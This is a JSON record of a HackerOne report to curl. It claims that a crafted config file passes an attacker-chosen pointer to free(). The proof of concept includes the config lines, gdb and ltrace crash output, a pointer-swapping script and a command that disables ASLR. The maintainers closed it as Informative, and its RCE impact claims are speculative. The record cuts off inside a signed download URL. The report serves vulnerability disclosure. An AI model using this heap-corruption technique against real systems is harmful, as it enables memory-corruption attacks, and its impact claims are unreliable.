{
  "id": 3434543,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDM0NTQz",
  "url": "https://hackerone.com/reports/3434543",
  "title": "Arbitrary free in curl's config file parsing.",
  "state": "Closed",
  "substate": "informative",
  "severity_rating": "low",
  "readable_substate": "Informative",
  "created_at": "2025-11-20T04:39:55.206Z",
  "submitted_at": "2025-11-20T04:39:55.617Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "is_triager?": false,
  "reporter": {
    "disabled": false,
    "username": "letshack9707",
    "url": "/letshack9707",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/ufak6b5s1bowv5ch0qf9m4be06qx/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 35663,
    "url": "https://hackerone.com/curl",
    "handle": "curl",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "curl",
      "twitter_handle": "",
      "website": "https://curl.se",
      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2025-11-23T16:03:02.482Z",
  "bug_reporter_agreed_on_going_public_at": "2025-11-23T16:03:02.349Z",
  "team_member_agreed_on_going_public_at": "2025-11-23T11:56:41.700Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\narbitrary free (leading to possible double-free / use-after-free / memory corruption, depending on the program and the ability of what a we can do after freeing the pointer we control. \n\nStatement clarifying if an AI was used to find the issue or generate the report: Yes  I used AI to list down  some resources related to this bug.\n\n## Affected version\n- curl 8.17.0 (x86_64-pc-linux-gnu) libcurl/8.17.0 OpenSSL/3.4.1 zlib/1.3.1 brotli/1.1.0 zstd/1.5.7 libidn2/2.3.8 libpsl/0.21.2 nghttp2/1.64.0 librtmp/2.3 OpenLDAP/2.6.9\nRelease-Date: 2025-11-05\nProtocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt pop3 pop3s rtmp rtsp smb smbs smtp smtps telnet tftp ws wss\nFeatures: alt-svc AsynchDNS brotli HSTS HTTP2 HTTPS-proxy IDN IPv6 Largefile libz NTLM PSL SSL threadsafe TLS-SRP UnixSockets zstd\n\n- and curl 8.16.0 is also affected, different samples and different controlled parameters in the config file.\n## OS/kernel: \n - tested on Linux kali 6.3.0-kali1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.3.7-1kali1.\n## Steps To Reproduce:\n\n1.>> ` touch host0.bin` and open it (vim host0.bin):   ........ F5027150 \n2. paste this : \n```\n-Z\n--url \"http://google.com/iernay{1-2}kFORFNUUklOR1JBTkRTVFJJTkdSQU5EU1RSSU5HUkFORFNUUklOR1JBTkRTVFJJTkdSQU5EU1RSSU5HUkFORFNUUklOR1JBTkRTVFJJT\"\n--url \"http://[::%2-socks5]:8080/\"\n--url google.com-Z[.-p].example.com\"\n--doh-url=127.0.0.1 \n```\n3. Run : \n```\n>> gdb -ex \"r\" --args curl --config host0.bin\n\n[ Legend: Modified register | Code | Heap | Stack | String ]\n────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────\n$rax   : 0x2e302e302e373231 (\"127.0.0.\"?)\n$rbx   : 0xffffffffffffff88\n$rcx   : 0x0000555555603aa0  →  0xffffffff00000001\n$rdx   : 0x0               \n$rsp   : 0x00007fffffffd440  →  0x00007fffffffd6c8  →  0x0000000000000001\n$rbp   : 0x00007fffffffd490  →  0x00007fffffffd6e0  →  0x00007fffffffd7b0  →  0x00007fffffffd7f0  →  0x00007fffffffd830  →  0x00007fffffffd890  →  0x00007fffffffd920  →  0x00007fffffffd960\n$rsi   : 0x2e302e302e373221 (\"!27.0.0.\"?)\n$rdi   : 0x2e302e302e373231 (\"127.0.0.\"?)\n$rip   : 0x00007ffff7cb24aa  →  <free+001a> mov rax, QWORD PTR [rdi-0x8]\n$r8    : 0x2               \n$r9    : 0x1               \n$r10   : 0x7               \n$r11   : 0x00005555556023d0  →  0x0000555000355422 (\"\"T5\"?)\n$r12   : 0x0               \n$r13   : 0x00007fffffffdb28  →  0x00007fffffffdec9  →  \"NMAP_PRIVILEGED=\"\n$r14   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047\n$r15   : 0x00005555555c6a18  →  0x000055555555e970  →  <__do_global_dtors_aux+0000> endbr64 \n$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]\n$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 \n────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────\n0x00007fffffffd440│+0x0000: 0x00007fffffffd6c8  →  0x0000000000000001\t ← $rsp\n0x00007fffffffd448│+0x0008: 0x000000000000000e\n0x00007fffffffd450│+0x0010: 0x0000555555602c9d  →  \".-p].example.com\"\"\n0x00007fffffffd458│+0x0018: 0x00007fffffffd8b0  →  0x0000555555604920  →  0x00000003000bab1e\n0x00007fffffffd460│+0x0020: 0x00007fffffffd490  →  0x00007fffffffd6e0  →  0x00007fffffffd7b0  →  0x00007fffffffd7f0  →  0x00007fffffffd830  →  0x00007fffffffd890  →  0x00007fffffffd920\n0x00007fffffffd468│+0x0028: 0x000055555557e8a7  →  <glob_cleanup+00da> mov rax, QWORD PTR [rbp-0x18]\n0x00007fffffffd470│+0x0030: 0x00007fffffffd8b0  →  0x0000555555604920  →  0x00000003000bab1e\n0x00007fffffffd478│+0x0038: 0x00005555555cb618  →  0x00005555556019c0  →  0x632e656c676f6f00\n──────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────\n   0x7ffff7cb249e <free+000e>      push   rbx\n   0x7ffff7cb249f <free+000f>      sub    rsp, 0x18\n   0x7ffff7cb24a3 <free+0013>      mov    rbx, QWORD PTR [rip+0x144956]        # 0x7ffff7df6e00\n → 0x7ffff7cb24aa <free+001a>      mov    rax, QWORD PTR [rdi-0x8]\n   0x7ffff7cb24ae <free+001e>      mov    ebp, DWORD PTR fs:[rbx]\n   0x7ffff7cb24b1 <free+0021>      test   al, 0x2\n   0x7ffff7cb24b3 <free+0023>      jne    0x7ffff7cb2510 <__GI___libc_free+128>\n   0x7ffff7cb24b5 <free+0025>      mov    rdx, QWORD PTR [rip+0x1448e4]        # 0x7ffff7df6da0\n   0x7ffff7cb24bc <free+002c>      cmp    QWORD PTR fs:[rdx], 0x0\n──────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────\n[#0] Id 1, Name: \"curl\", stopped 0x7ffff7cb24aa in __GI___libc_free (), reason: SIGSEGV\n────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────\n[#0] 0x7ffff7cb24aa → __GI___libc_free(mem=0x2e302e302e373231)\n[#1] 0x55555557e8a7 → glob_cleanup(glob=0x5555555cb618 <globalconf+88>)\n[#2] 0x55555557e7ba → glob_url(glob=0x5555555cb618 <globalconf+88>, url=0x555555602c90 \"google.com-Z[.-p].example.com\\\"\", urlnum=0x5555555cb688 <globalconf+200>, error=0x7ffff7df84e0 <_IO_2_1_stderr_>)\n[#3] 0x555555575f32 → single_transfer(config=0x5555555ed9a0, share=0x5555555fff50, added=0x7fffffffd86e, skipped=0x7fffffffd86d)\n[#4] 0x55555557769d → transfer_per_config(config=0x5555555ed9a0, share=0x5555555fff50, added=0x7fffffffd86e, skipped=0x7fffffffd86d)\n[#5] 0x555555577704 → create_transfer(share=0x5555555fff50, added=0x7fffffffd86e, skipped=0x7fffffffd86d)\n[#6] 0x555555576a88 → add_parallel_transfers(multi=0x555555604920, share=0x5555555fff50, morep=0x7fffffffd8e0, addedp=0x7fffffffd8e1)\n[#7] 0x555555576f6a → parallel_transfers(share=0x5555555fff50)\n[#8] 0x5555555777bd → run_all_transfers(share=0x5555555fff50, result=CURLE_OK)\n[#9] 0x555555577be7 → operate(argc=0x3, argv=0x7fffffffdb08)\n──────────────────────────────────────────────────\ngef➤  \n```\n└─$ echo -ne \"0x2e302e302e373231\" |xxd -r -p |rev\n127.0.0.                                                            #   this is what we can control (for this config file) \n\nI created this python script `mutate.py`(F5027147)  that replaces the controlled data in heap0.bin (127.0.0.) with an address we need to pass to `__GI___libc_free`and write a new config file vuln.conf \n\n```\n>> python mutate.py 0x4242424242424242 &&  gdb -ex \"r\" --args curl --config vuln.conf\n\n─$ \n[ Legend: Modified register | Code | Heap | Stack | String ]\n────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────\n$rax   : 0x4242424242424242 (\"BBBBBBBB\"?)\n$rbx   : 0xffffffffffffff88\n$rcx   : 0x0000555555603aa0  →  0xffffffff00000001\n$rdx   : 0x0               \n$rsp   : 0x00007fffffffd440  →  0x00007fffffffd6c8  →  0x0000000000000001\n$rbp   : 0x00007fffffffd490  →  0x00007fffffffd6e0  →  0x00007fffffffd7b0  →  0x00007fffffffd7f0  →  0x00007fffffffd830  →  0x00007fffffffd890  →  0x00007fffffffd920  →  0x00007fffffffd960\n$rsi   : 0x4242424242424232 (\"2BBBBBBB\"?)\n$rdi   : 0x4242424242424242 (\"BBBBBBBB\"?)\n$rip   : 0x00007ffff7cb24aa  →  <free+001a> mov rax, QWORD PTR [rdi-0x8]\n$r8    : 0x2               \n$r9    : 0x1               \n$r10   : 0x7               \n$r11   : 0x00005555556023d0  →  0x0000555000355422 (\"\"T5\"?)\n$r12   : 0x0               \n$r13   : 0x00007fffffffdb28  →  0x00007fffffffdec9  →  \"NMAP_PRIVILEGED=\"\n$r14   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047\n$r15   : 0x00005555555c6a18  →  0x000055555555e970  →  <__do_global_dtors_aux+0000> endbr64 \n$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]\n$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 \n────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────\n0x00007fffffffd440│+0x0000: 0x00007fffffffd6c8  →  0x0000000000000001\t ← $rsp\n0x00007fffffffd448│+0x0008: 0x000000000000000e\n0x00007fffffffd450│+0x0010: 0x0000555555602c9d  →  \".-p].example.com\"\"\n0x00007fffffffd458│+0x0018: 0x00007fffffffd8b0  →  0x0000555555604920  →  0x00000003000bab1e\n0x00007fffffffd460│+0x0020: 0x00007fffffffd490  →  0x00007fffffffd6e0  →  0x00007fffffffd7b0  →  0x00007fffffffd7f0  →  0x00007fffffffd830  →  0x00007fffffffd890  →  0x00007fffffffd920\n0x00007fffffffd468│+0x0028: 0x000055555557e8a7  →  <glob_cleanup+00da> mov rax, QWORD PTR [rbp-0x18]\n0x00007fffffffd470│+0x0030: 0x00007fffffffd8b0  →  0x0000555555604920  →  0x00000003000bab1e\n0x00007fffffffd478│+0x0038: 0x00005555555cb618  →  0x00005555556019c0  →  0x632e656c676f6f00\n──────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────\n   0x7ffff7cb249e <free+000e>      push   rbx\n   0x7ffff7cb249f <free+000f>      sub    rsp, 0x18\n   0x7ffff7cb24a3 <free+0013>      mov    rbx, QWORD PTR [rip+0x144956]        # 0x7ffff7df6e00\n → 0x7ffff7cb24aa <free+001a>      mov    rax, QWORD PTR [rdi-0x8]\n   0x7ffff7cb24ae <free+001e>      mov    ebp, DWORD PTR fs:[rbx]\n   0x7ffff7cb24b1 <free+0021>      test   al, 0x2\n   0x7ffff7cb24b3 <free+0023>      jne    0x7ffff7cb2510 <__GI___libc_free+128>\n   0x7ffff7cb24b5 <free+0025>      mov    rdx, QWORD PTR [rip+0x1448e4]        # 0x7ffff7df6da0\n   0x7ffff7cb24bc <free+002c>      cmp    QWORD PTR fs:[rdx], 0x0\n──────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────\n[#0] Id 1, Name: \"curl\", stopped 0x7ffff7cb24aa in __GI___libc_free (), reason: SIGSEGV\n────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────\n[#0] 0x7ffff7cb24aa → __GI___libc_free(mem=0x4242424242424242)\n[#1] 0x55555557e8a7 → glob_cleanup(glob=0x5555555cb618 <globalconf+88>)\n[#2] 0x55555557e7ba → glob_url(glob=0x5555555cb618 <globalconf+88>, url=0x555555602c90 \"google.com-Z[.-p].example.com\\\"\", urlnum=0x5555555cb688 <globalconf+200>, error=0x7ffff7df84e0 <_IO_2_1_stderr_>)\n[#3] 0x555555575f32 → single_transfer(config=0x5555555ed9a0, share=0x5555555fff50, added=0x7fffffffd86e, skipped=0x7fffffffd86d)\n[#4] 0x55555557769d → transfer_per_config(config=0x5555555ed9a0, share=0x5555555fff50, added=0x7fffffffd86e, skipped=0x7fffffffd86d)\n[#5] 0x555555577704 → create_transfer(share=0x5555555fff50, added=0x7fffffffd86e, skipped=0x7fffffffd86d)\n[#6] 0x555555576a88 → add_parallel_transfers(multi=0x555555604920, share=0x5555555fff50, morep=0x7fffffffd8e0, addedp=0x7fffffffd8e1)\n[#7] 0x555555576f6a → parallel_transfers(share=0x5555555fff50)\n[#8] 0x5555555777bd → run_all_transfers(share=0x5555555fff50, result=CURLE_OK)\n[#9] 0x555555577be7 → operate(argc=0x3, argv=0x7fffffffdb08)\ngef➤  where \n#0  0x00007ffff7cb24aa in __GI___libc_free (mem=0x4242424242424242) at ./malloc/malloc.c:3375\n#1  0x000055555557e8a7 in glob_cleanup (glob=0x5555555cb618 <globalconf+88>) at tool_urlglob.c:499\n#2  0x000055555557e7ba in glob_url (glob=0x5555555cb618 <globalconf+88>, \n    url=0x555555602c90 \"google.com-Z[.-p].example.com\\\"\", urlnum=0x5555555cb688 <globalconf+200>, \n    error=0x7ffff7df84e0 <_IO_2_1_stderr_>) at tool_urlglob.c:481\n#3  0x0000555555575f32 in single_transfer (config=0x5555555ed9a0, share=0x5555555fff50, added=0x7fffffffd86e, \n    skipped=0x7fffffffd86d) at tool_operate.c:1233\n#4  0x000055555557769d in transfer_per_config (config=0x5555555ed9a0, share=0x5555555fff50, added=0x7fffffffd86e, \n    skipped=0x7fffffffd86d) at tool_operate.c:2132\n#5  0x0000555555577704 in create_transfer (share=0x5555555fff50, added=0x7fffffffd86e, skipped=0x7fffffffd86d)\n    at tool_operate.c:2151\n#6  0x0000555555576a88 in add_parallel_transfers (multi=0x555555604920, share=0x5555555fff50, morep=0x7fffffffd8e0, \n    addedp=0x7fffffffd8e1) at tool_operate.c:1486\n#7  0x0000555555576f6a in parallel_transfers (share=0x5555555fff50) at tool_operate.c:1840\n#8  0x00005555555777bd in run_all_transfers (share=0x5555555fff50, result=CURLE_OK) at tool_operate.c:2173\n#9  0x0000555555577be7 in operate (argc=0x3, argv=0x7fffffffdb08) at tool_operate.c:2314\n#10 0x0000555555573096 in main (argc=0x3, argv=0x7fffffffdb08) at tool_main.c:199\ngef➤  frame 1 \n#1  0x000055555557e8a7 in glob_cleanup (glob=0x5555555cb618 <globalconf+88>) at tool_urlglob.c:499\n499\t          tool_safefree(glob->pattern[i].c.set.elem[elem]);\ngef➤  list \n494\t  if(glob->pattern) {\n495\t    for(i = 0; i < glob->size; i++) {\n496\t      if((glob->pattern[i].type == GLOB_SET) &&\n497\t         (glob->pattern[i].c.set.elem)) {\n498\t        for(elem = glob->pattern[i].c.set.size - 1; elem >= 0; --elem)\n499\t          tool_safefree(glob->pattern[i].c.set.elem[elem]);\n500\t        tool_safefree(glob->pattern[i].c.set.elem);\n501\t      }\n502\t    }\n503\t    tool_safefree(glob->pattern);\n─────────────────────────────────────────────────────────\n```\n\nWe can also confirm this using ltrace utility: \n```\n>>  ltrace curl --config vuln.conf\n...................\n..................\ncurl_easy_setopt(0x5555556123e0, 99, 1, 0x2777)                         = 0\ncurl_easy_setopt(0x5555556123e0, 0x4efb, 0x55555557a7d7, 1)             = 0\ncurl_easy_setopt(0x5555556123e0, 0x2749, 0x555555601500, 24)            = 0\ncurl_easy_setopt(0x5555556123e0, 43, 0, 0x2749)                         = 0\ncurl_easy_setopt(0x5555556123e0, 0x271a, 0x5555556016c8, 0)             = 0\ncurl_multi_add_handle(0x555555604920, 0x5555556123e0, 0x5555556123e0, 0x271a) = 0\ncurl_getenv(0x55555558f16b, 0x5555555fff50, 0, 0x7fffffffd89d)          = 0\ncurl_getenv(0x55555558f17a, 0x7fffffffef4f, 14, 79)                     = 0\ncurl_getenv(0x55555558f187, 0x55555558f17a, 12, 83)                     = 0\nfree(nil)                                                               = <void>\nmemset(0x5555555cb618, '\\0', 80)                                        = 0x5555555cb618\nmalloc(96)                                                              = 0x555555600180\nrealloc(nil, 32)                                                        = 0x5555556019c0\nmemcpy(0x5555556019c0, \"g\", 1)                                          = 0x5555556019c0\nmemcpy(0x5555556019c1, \"o\", 1)                                          = 0x5555556019c1\nmemcpy(0x5555556019c2, \"o\", 1)                                          = 0x5555556019c2\nmemcpy(0x5555556019c3, \"g\", 1)                                          = 0x5555556019c3\nmemcpy(0x5555556019c4, \"l\", 1)                                          = 0x5555556019c4\nmemcpy(0x5555556019c5, \"e\", 1)                                          = 0x5555556019c5\nmemcpy(0x5555556019c6, \".\", 1)                                          = 0x5555556019c6\nmemcpy(0x5555556019c7, \"c\", 1)                                          = 0x5555556019c7\nmemcpy(0x5555556019c8, \"o\", 1)                                          = 0x5555556019c8\nmemcpy(0x5555556019c9, \"m\", 1)                                          = 0x5555556019c9\nmemcpy(0x5555556019ca, \"-\", 1)                                          = 0x5555556019ca\nmemcpy(0x5555556019cb, \"Z\", 1)                                          = 0x5555556019cb\nstrchr(\"[.-p].example.com\"\", ']')                                       = \"].example.com\"\"\ncurl_url(0x555555602c9c, 93, 0x7fffffffd498, 0x55555560195a)            = 0x5555556039e0\nmemcpy(0x7fffffffd3c0, \"[.-p]\", 5)                                      = 0x7fffffffd3c0\ncurl_url_set(0x5555556039e0, 0, 0x7fffffffd3c0, 512)                    = 22\ncurl_url_cleanup(0x5555556039e0, 0x5555556001e0, 0x7ffff7cb2490, 49)    = 0x5555555cc010\nmalloc(8)                                                               = 0x5555556023d0\nmalloc(13)                                                              = 0x555555600220\nmemcpy(0x555555600220, \"google.com-Z\", 12)                              = 0x555555600220\nstrchr(\"[.-p].example.com\"\", ']')                                       = \"].example.com\"\"\ncurl_url(0x555555602c9c, 93, 0x7fffffffd498, 0x5a2d6d6f632e656c)        = 0x555555603a40\nmemcpy(0x7fffffffd3c0, \"[.-p]\", 5)                                      = 0x7fffffffd3c0\ncurl_url_set(0x555555603a40, 0, 0x7fffffffd3c0, 512)                    = 22\ncurl_url_cleanup(0x555555603a40, 0x5555556001e0, 0x7ffff7cb2490, 49)    = 0x5555555cc010\nrealloc(0x555555600180, 192)                                            = 0x555555603aa0\ncurl_msnprintf(0x7fffffffd4f0, 512, 0x5555555903d8, 0x55555559038a)     = 89\ncurl_mfprintf(0x7ffff7df84e0, 0x5555555903fa, 3, 0x7fffffffd4f0curl: (3) bad range specification in URL position 14:\ngoogle.com-Z[.-p].example.com\"\n             ^\n)        = 100\nfree(0x555555600220)                                                    = <void>\nfree(0x5555556023d0)                                                    = <void>\nfree(0x4242424242424242 <no return ...>\n--- SIGSEGV (Segmentation fault) ---\n+++ killed by SIGSEGV +++\n```\nNow that we confirmed that we have control over the pointer passed to free(`free(0x4242424242424242 <no return ...>`) we can analyse our program and decide what we can do with it. \n\nfor Simplicity, I disabled ASLR at this point: \n```\n>> echo 0 > /proc/sys/kernel/randomize_va_space\n```\nltrace -e free -o free.txt curl --config vuln.conf    (F5027151) \nNow if  I take any address that has been freed already, and write it in the config file (vuln.conf)  I got this : \n\n```\n─$ python mutate.py  0x555555602dd0 && ltrace curl --config vuln.conf \nmalloc(13)                                                              = 0x555555600220\nmemcpy(0x555555600220, \"google.com-Z\", 12)                              = 0x555555600220\nstrchr(\"[.-p].example.com\"\", ']')                                       = \"].example.com\"\"\ncurl_url(0x555555602c9c, 93, 0x7fffffffd498, 0x5a2d6d6f632e656c)        = 0x555555603a40\nmemcpy(0x7fffffffd3c0, \"[.-p]\", 5)                                      = 0x7fffffffd3c0\ncurl_url_set(0x555555603a40, 0, 0x7fffffffd3c0, 512)                    = 22\ncurl_url_cleanup(0x555555603a40, 0x5555556001e0, 0x7ffff7cb2490, 49)    = 0x5555555cc010\nrealloc(0x555555600180, 192)                                            = 0x555555603aa0\ncurl_msnprintf(0x7fffffffd4f0, 512, 0x5555555903d8, 0x55555559038a)     = 89\ncurl_mfprintf(0x7ffff7df84e0, 0x5555555903fa, 3, 0x7fffffffd4f0curl: (3) bad range specification in URL position 14:\ngoogle.com-Z[.-p].example.com\"\n             ^\n)        = 100\nfree(0x555555600220)                                                    = <void>\nfree(0x5555556023d0)                                                    = <void>\nfree(0x555555602dd0)                                                    = <void>\nfree(0x555555602dd0free(): double free detected in tcache 2\n <no return ...>\n--- SIGABRT (Aborted) ---\n+++ killed by SIGABRT +++\n```\n\n##Notes \n- So this is one version of the config file, it's like I generated lots of curl paramaters and propagate them in curl's config file, so I managed to pass data that I can control to free (corrupt heap) \n\n- Each variant exposes different pieces of controllable data that eventually reach __GI___libc_free. Some values cannot be influenced because they originate from internal cURL symbols,  when several other variants give full control over the pointer passed to free().\n\n- Note that I haven't managed to trigger the the same crash with C code ( using <curl/curl.h> ), but it might be feasible\n\n\n- This represents one variant of the config file exploitation. By generating multiple curl parameters and propagating them through curl's configuration file, I managed to pass controllable data to the free() function, leading to heap corruption.\n\n- Different variants expose varying degrees of controllable data that eventually reach `__GI___libc_free(0x...)`. Some pointer values cannot be influenced as they originate from internal cURL symbols, while other variants provide full control over the pointer passed to free().\n\n-  I have not managed to trigger the same crash using C code with <curl/curl.h>, though it might be feasible.\n\n## I set severity to Low, because: \n- Exploitation requires tricking a user into running a crafted config file, we can also use `~/.curlrc` config file for suspecious parameters.\n\n- Curl is already capable to execute commands, (This vulnerability arises from how curl processes configuration files, not from any inherent command-execution capability).\n\n- This needs additional vulnerability (Arbitrary read, memory leak, ..) to bypass ASLR/Tcache Mitigation, unless we leverage the same bug to achieve  Read/Write primitive to later it to bypass ASLR and Tcache Mitigations. \n\n## Supporting Material/References:\nhttps://curl.se/\n\n## Impact\n\nImpact: \nControlled pointer passed to free -->  potential double-free/use-after-free --> RCE / privilege escalation, depends on the environment where curl run. \n- Requires user to execute malicious config file",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 5027147,
      "file_name": "mutate.py",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/97hyvl64ukrzewxws8squtkr8hea?response-content-disposition=attachment%3B%20filename%3D%22mutate.py%22%3B%20filename%2A%3DUTF-8%27%27mutate.py&response-content-type=text%2Fx-python&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU7HFG7QO%2F20251123%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20251123T161508Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJIMEYCIQDwX9h8RZDj6CCFNUGHFosynUKqB1AFr6Okk%2FfjcqrUDAIhAJ9iBeE4s%2B3ijFANNOfLlVRw0zVrzVdB7hoeROzgIT8JKrIFCEAQAxoMMDEzNjE5Mjc0ODQ5IgzLjnDnV4coCHIRSNoqjwUVur3%2F97nrtsqr6i%2FLNEAf%2FTVxp41GmUZnyZ5V0a9cJMKg9HeaZ%2BuHmVaQFJyLnWLW9eDYGo9Q9%2FpGiqwn7DoeJ9ng5%2BWf4LwuEbSYVTMO7r6PvnTkKOscgnfVwKWwNooq7tu1COV2ryVEpj8VyJRGHdyvxEy3hJt0is9Uwef56iAw7ObyYXmS4UZc0INV3s99jxrEjE0BT7fhI0qiO0oVAr3FI2vG%2Ftu8z8DR%2FoZ7vJyeVQCXEqDbmR6MW8zOfJKVidrl9ya36BJeEeZ7vLP019b5vK5X%2Bm5cStGDIdSwPYfFVqj6a5vD1nnO2Avj%2FUB1cTu7NG7sYeLGjAahk03zmqZl4s6OH6RnZX9kyFvyDaIJEiz7FJa44xc8wLTeSx9zBxONB9XU15cI2xI0Qj5tWFcyhxI4bodSdHRJxQvubuqxICbwVkdZlrh%2BK4b%2Bo%2B%2F970cFk1jAPlRlFiardi4XN8Rd4sKPuXIvOuiqgVdRjk4RFF9hH1TOAbJWzwKDDAazmdAYlzcml7lL8ctxY0DIxPtEmkv%2F1%2FU%2BEQkBaCRF514%2FgKTCYRrt%2B8asJTidcYPpMGQTEdARw0j262MBceNxsKUOCrH1cHBy3zBD6UlFM2mZ1L2xKykCurzQ3sxIZazMy3Kaq85Gd7UQchKd5q7yLqGHnVO7mWC2Kma9B8O9DEqXguxkbHQKJWqp0itS46VGeJ7wa4twod0ZuJLZTzfRisZP%2FrT4AYqoaAKOhDxwJ40kQ%2FnMXVcds9o%2F8VYK9SAAgR0OI8%2Bf4qRgGJmzNEYOl2Z%2B5xsp%2FQ69hSQa1XiJ8qYZAw9zk1r4wFQ2jZxfyVKkpJOezwFYXptplz8UK4FHjRIhZ37ZcpNqVXIEMJ0TMLS%2FjMkGOrAB%2BuZr4LBwtkD4Z7bmOkHK9k6hi9dNb3WbdRdp9sXQAfHa2j2kcwS4tna7vgR%2BvcODJmFBVjnwa%2BEYWgVpZ50%2BFeLSbZ8Nwl5jgdGsF3uLZf48OpX6uVgSLaOfAYB1YqecEflpOosU9fF27v67N4OC2Z5leTj3dmoDww10f%2BAHqmw7chcliN3PSNMn%2F%2FjqPTrrWTjkZ04LwDD4pkw10Ivwc0kXPlLYyfFBt%2F%2B15gF3ZyE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=41f7f81d4c3fd1c7b12df9249efd7c722e0d7416989712bc25db18ac7053ed81",
      "file_size": 990,
      "type": "text/x-python",
      "moderated": null
    },
    {
      "id": 5027150,
      "file_name": "host0.bin",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2uf5d54bjvw9jfmczq2kibgjvjrp?response-content-disposition=attachment%3B%20filename%3D%22host0.bin%22%3B%20filename%2A%3DUTF-8%27%27host0.bin&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU7HFG7QO%2F20251123%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20251123T161508Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJIMEYCIQDwX9h8RZDj6CCFNUGHFosynUKqB1AFr6Okk%2FfjcqrUDAIhAJ9iBeE4s%2B3ijFANNOfLlVRw0zVrzVdB7hoeROzgIT8JKrIFCEAQAxoMMDEzNjE5Mjc0ODQ5IgzLjnDnV4coCHIRSNoqjwUVur3%2F97nrtsqr6i%2FLNEAf%2FTVxp41GmUZnyZ5V0a9cJMKg9HeaZ%2BuHmVaQFJyLnWLW9eDYGo9Q9%2FpGiqwn7DoeJ9ng5%2BWf4LwuEbSYVTMO7r6PvnTkKOscgnfVwKWwNooq7tu1COV2ryVEpj8VyJRGHdyvxEy3hJt0is9Uwef56iAw7ObyYXmS4UZc0INV3s99jxrEjE0BT7fhI0qiO0oVAr3FI2vG%2Ftu8z8DR%2FoZ7vJyeVQCXEqDbmR6MW8zOfJKVidrl9ya36BJeEeZ7vLP019b5vK5X%2Bm5cStGDIdSwPYfFVqj6a5vD1nnO2Avj%2FUB1cTu7NG7sYeLGjAahk03zmqZl4s6OH6RnZX9kyFvyDaIJEiz7FJa44xc8wLTeSx9zBxONB9XU15cI2xI0Qj5tWFcyhxI4bodSdHRJxQvubuqxICbwVkdZlrh%2BK4b%2Bo%2B%2F970cFk1jAPlRlFiardi4XN8Rd4sKPuXIvOuiqgVdRjk4RFF9hH1TOAbJWzwKDDAazmdAYlzcml7lL8ctxY0DIxPtEmkv%2F1%2FU%2BEQkBaCRF514%2FgKTCYRrt%2B8asJTidcYPpMGQTEdARw0j262MBceNxsKUOCrH1cHBy3zBD6UlFM2mZ1L2xKykCurzQ3sxIZazMy3Kaq85Gd7UQchKd5q7yLqGHnVO7mWC2Kma9B8O9DEqXguxkbHQKJWqp0itS46VGeJ7wa4twod0ZuJLZTzfRisZP%2FrT4AYqoaAKOhDxwJ40kQ%2FnMXVcds9o%2F8VYK9SAAgR0OI8%2Bf4qRgGJmzNEYOl2Z%2B5xsp%2FQ69hSQa1XiJ8qYZAw9zk1r4wFQ2jZxfyVKkpJOezwFYXptplz8UK4FHjRIhZ37ZcpNqVXIEMJ0TMLS%2FjMkGOrAB%2BuZr4LBwtkD4